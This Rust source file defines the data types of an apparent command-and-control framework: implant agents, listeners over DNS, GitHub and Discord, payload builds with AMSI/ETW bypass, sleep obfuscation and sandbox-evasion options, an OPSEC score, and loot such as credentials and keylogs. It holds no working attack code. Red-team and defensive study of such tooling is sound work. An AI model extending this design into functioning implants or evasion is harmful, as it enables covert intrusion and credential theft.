use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::fmt;
use strum_macros::EnumString;
use uuid::Uuid;

// ── Agent ─────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum AgentStatus {
    Active,
    Stale,     // missed > 2 beacons
    Dead,      // missed > 10 beacons or manual kill
}

impl fmt::Display for AgentStatus {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            AgentStatus::Active => write!(f, "ACTIVE"),
            AgentStatus::Stale  => write!(f, "STALE"),
            AgentStatus::Dead   => write!(f, "DEAD"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum Privilege {
    User,
    Admin,
    System,
}

impl fmt::Display for Privilege {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Privilege::User   => write!(f, "User"),
            Privilege::Admin  => write!(f, "Admin"),
            Privilege::System => write!(f, "SYSTEM"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentInfo {
    pub id:           Uuid,
    pub hostname:     String,
    pub username:     String,
    pub domain:       Option<String>,
    pub ip:           String,
    pub os:           String,
    pub arch:         String,
    pub pid:          u32,
    pub privilege:    Privilege,
    pub listener_id:  Uuid,
    pub build_id:     String,
    pub sleep_ms:     u64,
    pub jitter_pct:   u8,
    pub status:       AgentStatus,
    pub first_seen:   DateTime<Utc>,
    pub last_seen:    DateTime<Utc>,
    pub missed_beats: u32,
}

// ── Listener ──────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, EnumString)]
#[serde(rename_all = "lowercase")]
pub enum ListenerProtocol {
    #[strum(serialize = "http")]
    Http,
    #[strum(serialize = "https")]
    Https,
    #[strum(serialize = "tcp")]
    Tcp,
    #[strum(serialize = "dns")]
    Dns,
    #[strum(serialize = "github")]
    Github,
    #[strum(serialize = "discord")]
    Discord,
}

impl fmt::Display for ListenerProtocol {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let s = match self {
            ListenerProtocol::Http    => "http",
            ListenerProtocol::Https   => "https",
            ListenerProtocol::Tcp     => "tcp",
            ListenerProtocol::Dns     => "dns",
            ListenerProtocol::Github  => "github",
            ListenerProtocol::Discord => "discord",
        };
        write!(f, "{s}")
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ListenerConfig {
    pub id:          Uuid,
    pub name:        String,
    pub protocol:    ListenerProtocol,
    pub host:        String,
    pub port:        u16,
    pub tls_cert:    Option<String>,
    pub tls_key:     Option<String>,
    // DNS-specific
    pub dns_domain:  Option<String>,
    // SaaS C2
    pub saas_token:  Option<String>,
    pub saas_gist:   Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum ListenerStatus {
    Running,
    Stopped,
    Disabled, // manually stopped by operator — manager will not auto-restart
    Error(String),
}

impl fmt::Display for ListenerStatus {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            ListenerStatus::Running    => write!(f, "RUNNING"),
            ListenerStatus::Stopped    => write!(f, "STOPPED"),
            ListenerStatus::Disabled   => write!(f, "DISABLED"),
            ListenerStatus::Error(e)   => write!(f, "ERROR: {e}"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ListenerInfo {
    pub config: ListenerConfig,
    pub status: ListenerStatus,
    pub agents: u32,
}

// ── Build / Payload ───────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, EnumString)]
#[serde(rename_all = "snake_case")]
pub enum PayloadFormat {
    #[strum(serialize = "exe")]
    Exe,
    #[strum(serialize = "dll")]
    Dll,
    #[strum(serialize = "shellcode")]
    Shellcode,
}

impl fmt::Display for PayloadFormat {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            PayloadFormat::Exe       => write!(f, "exe"),
            PayloadFormat::Dll       => write!(f, "dll"),
            PayloadFormat::Shellcode => write!(f, "shellcode"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "snake_case")]
pub enum SleepObf {
    None,
    Ekko,
    Foliage,
    Zilean,
}

impl fmt::Display for SleepObf {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            SleepObf::None    => write!(f, "none"),
            SleepObf::Ekko    => write!(f, "ekko"),
            SleepObf::Foliage => write!(f, "foliage"),
            SleepObf::Zilean  => write!(f, "zilean"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "snake_case")]
pub enum InjectionMethod {
    CreateThread,
    NtCreateThreadEx,
    ApcQueue,
}

impl fmt::Display for InjectionMethod {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            InjectionMethod::CreateThread    => write!(f, "CreateThread"),
            InjectionMethod::NtCreateThreadEx => write!(f, "NtCreateThreadEx"),
            InjectionMethod::ApcQueue        => write!(f, "APC Queue"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BuildOptions {
    pub listener_id:       Uuid,
    pub format:            PayloadFormat,
    pub sleep_ms:          u64,
    pub jitter_pct:        u8,
    pub output_path:       String,
    // ── evasion
    pub sleep_obf:         SleepObf,
    pub injection:         InjectionMethod,
    pub amsi_bypass:       bool,
    pub etw_bypass:        bool,
    pub sandbox_evasion:   bool,
    pub indirect_syscalls: bool,
    pub stack_spoof:       bool,
    pub module_stomp:      bool,
    pub block_dlls:        bool,
    pub encrypted_comms:   bool,
    pub dns_dga:           bool,
    // ── operator flags
    pub server_pubkey:     String,
    // ── C2 connection
    pub c2_host:           String,
    pub c2_port:           u16,
    pub protocol:          String,
}

impl BuildOptions {
    /// Calculate OPSEC score 0–100 based on selected evasion features.
    pub fn opsec_score(&self) -> u8 {
        let mut score: u16 = 0;

        if self.indirect_syscalls { score += 15; }
        if self.amsi_bypass        { score += 10; }
        if self.etw_bypass         { score += 10; }
        if self.sandbox_evasion    { score += 10; }
        if self.block_dlls         { score += 5;  }
        if self.encrypted_comms    { score += 10; }
        if self.stack_spoof        { score += 15; }
        if self.module_stomp       { score += 10; }
        if self.dns_dga            { score += 5;  }

        score += match self.sleep_obf {
            SleepObf::None    => 0,
            SleepObf::Ekko    => 10,
            SleepObf::Foliage => 15,
            SleepObf::Zilean  => 20,
        };

        score += match self.injection {
            InjectionMethod::CreateThread    => 0,
            InjectionMethod::NtCreateThreadEx => 5,
            InjectionMethod::ApcQueue        => 10,
        };

        (score.min(100)) as u8
    }

    pub fn opsec_label(score: u8) -> (&'static str, &'static str) {
        if score >= 75      { ("LOW RISK",      "green") }
        else if score >= 45 { ("MODERATE RISK", "yellow") }
        else                { ("HIGH RISK",     "red") }
    }
}

// ── Task / Loot ───────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentTask {
    pub id:      Uuid,
    pub command: String,
    pub args:    Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentResult {
    pub task_id:  Uuid,
    pub agent_id: Uuid,
    pub output:   String,
    pub error:    Option<String>,
    pub timestamp: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LootEntry {
    pub id:       Uuid,
    pub agent_id: Uuid,
    pub kind:     LootKind,
    pub data:     String,
    pub timestamp: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum LootKind {
    Credential,
    Hash,
    Key,
    Screenshot,
    Keylog,
    File,
    Token,
}

impl fmt::Display for LootKind {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            LootKind::Credential => write!(f, "CRED"),
            LootKind::Hash       => write!(f, "HASH"),
            LootKind::Key        => write!(f, "KEY"),
            LootKind::Screenshot => write!(f, "SCREENSHOT"),
            LootKind::Keylog     => write!(f, "KEYLOG"),
            LootKind::File       => write!(f, "FILE"),
            LootKind::Token      => write!(f, "TOKEN"),
        }
    }
}
